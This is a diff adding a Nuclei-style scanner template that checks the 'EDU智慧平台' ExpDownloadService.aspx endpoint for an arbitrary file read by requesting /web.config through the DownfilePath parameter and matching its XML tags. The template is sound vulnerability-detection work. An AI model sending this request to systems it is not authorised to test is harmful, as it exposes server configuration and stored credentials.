@@ -1,0 +1,22 @@
+id: poc-yaml-edu-system-expdownloadservice-fileread
+info:
+  name: EDU智慧平台 ExpDownloadService.aspx Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ExpDownloadService.aspx?DownfilePath=/web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<configuration>"
+          - "<configSections>"
+          - "</sectionGroup>"
+          - "<add>"
+        part: body
